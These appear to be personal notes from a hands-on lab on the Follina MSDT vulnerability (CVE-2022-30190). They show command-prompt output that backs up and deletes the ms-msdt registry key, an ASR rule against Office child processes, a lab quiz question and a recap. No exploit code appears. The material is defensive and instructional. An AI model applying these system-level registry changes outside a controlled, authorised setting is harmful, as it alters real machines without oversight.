The operation completed successfully.

C:\Users\Administrator\Desktop> reg delete HKEY_CLASSES_ROOT\ms-msdt /f
The operation completed successfully.

C:\Users\Administrator\Desktop> reg query HKEY_CLASSES_ROOT\ms-msdt
ERROR: The system was unable to find the specified registry key or value.


```

By now, you must have noticed that we're always changing our working directory to the Desktop - it's so we can immediately see the changes that our commands are introducing to the environment: file creation is fairly noticeable. It is by no means, however, the best practice to do in any environment.

The first reg query command that we've introduced is a quick check that the key exists. It is followed by reg export that exports our key into a file so we may be able to reintegrate it in our system later on when Microsoft comes up with a more permanent fix to this vulnerability. The exported file is saved in the current working directory - in our case the Desktop.

The reg delete command is the command that actually disables the MSDT URL Protocol mainly because it essentially removes it altogether from the system. The final reg query command is a confirmatory check that the key no longer exists.

Upon disabling the MSDT URL Protocol in our Windows machine, let's try to trigger the exploit again, and see how it impacts the machine. This is a good way to check if our controls would be able to catch attacks, regardless if they're successful or not.

Attack Surface Reduction (ASR)

If you’re using Microsoft Defender for Endpoint in your environment, enable the ASR rule Block all Office applications from creating child. Creating child processes from services that should not have been doing that is a common theme among malwares.

Further Reading: Guidance for CVE-2022-30190 Microsoft Support Diagnostic Tool Vulnerability – Microsoft Security Response Center
https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/



What error message did the document give upon opening?

That error that you've just noticed, had you not known that we're doing an experiment here, is called an Indicator of Attack. You must be very cautious of these kinds of error messages in your own environments.
![](https://miro.medium.com/max/720/1*G9RyCJGNr_FJr9RC12g2gQ.png)

```
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>reg query HKEY_CLASSES_ROOT\ms-msdt

HKEY_CLASSES_ROOT\ms-msdt
    (Default)    REG_SZ    URL:ms-msdt
    EditFlags    REG_DWORD    0x200000
    URL Protocol    REG_SZ

HKEY_CLASSES_ROOT\ms-msdt\shell

C:\Users\Administrator\Desktop>reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt_backup
The operation completed successfully.

C:\Users\Administrator\Desktop>reg delete HKEY_CLASSES_ROOT\ms-msdt /f
The operation completed successfully.

C:\Users\Administrator\Desktop>reg query HKEY_CLASSES_ROOT\ms-msdt
ERROR: The system was unable to find the specified registry key or value.
```

![[Pasted image 20221028195855.png]]

*You'll need a new app to open this ms-msdt*

https://www.youtube.com/watch?v=dGCOhORNKRk


### Room Recap + Recent Developments 

This room explored the MSDT Service and its vulnerability history. It touched upon the idea that features, no matter the intended purpose, will be abused sooner or later. There is no shortage of creativity in this industry, and every so often, exploitation of vulnerabilities such as this is being discovered in the wild.

This room has also emphasized the importance of establishing a proper baseline and consequently explored threat hunting techniques that are transferrable in most environments through the use of simple tools that can easily be downloaded and deployed. This is closely followed by a threat hunting challenge that can be solved by following said techniques.

Finally, a couple of remediation processes that are both straightforward and easily deployable has been the chosen method of closing this topic
https://www.bleepingcomputer.com/news/security/microsoft-patches-actively-exploited-follina-windows-zero-day/

As of room publishing, Microsoft has already released a patch that blocks PowerShell injection, effectively disabling that attack vector. 

This room will be updated from time to time.


See you again soon, and happy hunting!


[[Keldagrim]]